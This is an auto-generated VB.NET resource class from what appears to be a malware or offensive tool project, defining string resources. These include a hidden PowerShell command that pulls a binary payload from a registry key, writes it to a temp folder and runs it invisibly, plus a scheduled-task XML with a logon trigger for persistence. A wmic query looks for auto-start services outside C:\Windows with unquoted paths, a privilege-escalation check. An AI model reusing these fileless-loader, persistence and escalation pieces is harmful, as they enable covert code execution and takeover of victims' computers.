﻿'------------------------------------------------------------------------------
' <auto-generated>
'     This code was generated by a tool.
'     Runtime Version:4.0.30319.42000
'
'     Changes to this file may cause incorrect behavior and will be lost if
'     the code is regenerated.
' </auto-generated>
'------------------------------------------------------------------------------

Option Strict On
Option Explicit On

Imports System

Namespace My.Resources
    
    'This class was auto-generated by the StronglyTypedResourceBuilder
    'class via a tool like ResGen or Visual Studio.
    'To add or remove a member, edit your .ResX file then rerun ResGen
    'with the /str option, or rebuild your VS project.
    '''<summary>
    '''  A strongly-typed resource class, for looking up localized strings, etc.
    '''</summary>
    <Global.System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0"),  _
     Global.System.Diagnostics.DebuggerNonUserCodeAttribute(),  _
     Global.System.Runtime.CompilerServices.CompilerGeneratedAttribute(),  _
     Global.Microsoft.VisualBasic.HideModuleNameAttribute()>  _
    Friend Module Resources
        
        Private resourceMan As Global.System.Resources.ResourceManager
        
        Private resourceCulture As Global.System.Globalization.CultureInfo
        
        '''<summary>
        '''  Returns the cached ResourceManager instance used by this class.
        '''</summary>
        <Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)>  _
        Friend ReadOnly Property ResourceManager() As Global.System.Resources.ResourceManager
            Get
                If Object.ReferenceEquals(resourceMan, Nothing) Then
                    Dim temp As Global.System.Resources.ResourceManager = New Global.System.Resources.ResourceManager("VB.Resources", GetType(Resources).Assembly)
                    resourceMan = temp
                End If
                Return resourceMan
            End Get
        End Property
        
        '''<summary>
        '''  Overrides the current thread's CurrentUICulture property for all
        '''  resource lookups using this strongly typed resource class.
        '''</summary>
        <Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)>  _
        Friend Property Culture() As Global.System.Globalization.CultureInfo
            Get
                Return resourceCulture
            End Get
            Set
                resourceCulture = value
            End Set
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to &lt;!DOCTYPE html&gt;
        '''&lt;html&gt;
        '''&lt;head&gt;
        '''	&lt;title&gt;^TTL^&lt;/title&gt;
        '''&lt;/head&gt;
        '''&lt;body&gt;
        '''^BODY^
        '''&lt;/body&gt;
        '''&lt;/html&gt;.
        '''</summary>
        Friend ReadOnly Property fwsp() As String
            Get
                Return ResourceManager.GetString("fwsp", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to powershell -w hidden -c &quot;$p = [System.IO.Path]::GetTempPath();$n = [System.Guid]::NewGuid();$s=(Join-Path $p $n);ni -it d -p $s;$b=(gp -path &apos;HKCU:\Software\APS&apos;).&apos;^N^&apos;; sc $s\^N^.^E^ $b -en byte; saps -wi hidden cmd &quot;&quot;/C start $s\^N^.^E^&quot;&quot;&quot;.
        '''</summary>
        Friend ReadOnly Property powershell() As String
            Get
                Return ResourceManager.GetString("powershell", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16&quot;?&gt;
        '''&lt;Task version=&quot;1.2&quot; xmlns=&quot;http://schemas.microsoft.com/windows/2004/02/mit/task&quot;&gt;
        '''  &lt;RegistrationInfo&gt;
        '''    &lt;Date&gt;2017-05-06T00:37:15&lt;/Date&gt;
        '''    &lt;Author&gt;^U^&lt;/Author&gt;
        '''  &lt;/RegistrationInfo&gt;
        '''  &lt;Triggers&gt;
        '''    &lt;LogonTrigger&gt;
        '''      &lt;StartBoundary&gt;2017-05-06T00:37:00&lt;/StartBoundary&gt;
        '''      &lt;Enabled&gt;true&lt;/Enabled&gt;
        '''    &lt;/LogonTrigger&gt;
        '''  &lt;/Triggers&gt;
        '''  &lt;Principals&gt;
        '''    &lt;Principal id=&quot;Author&quot;&gt;
        '''      &lt;UserId&gt;^P^\^U^&lt;/UserId&gt;
        '''      &lt;LogonType&gt;InteractiveToken&lt;/LogonTy [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property task() As String
            Get
                Return ResourceManager.GetString("task", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to service get pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;.
        '''</summary>
        Friend ReadOnly Property wmic() As String
            Get
                Return ResourceManager.GetString("wmic", resourceCulture)
            End Get
        End Property
    End Module
End Namespace
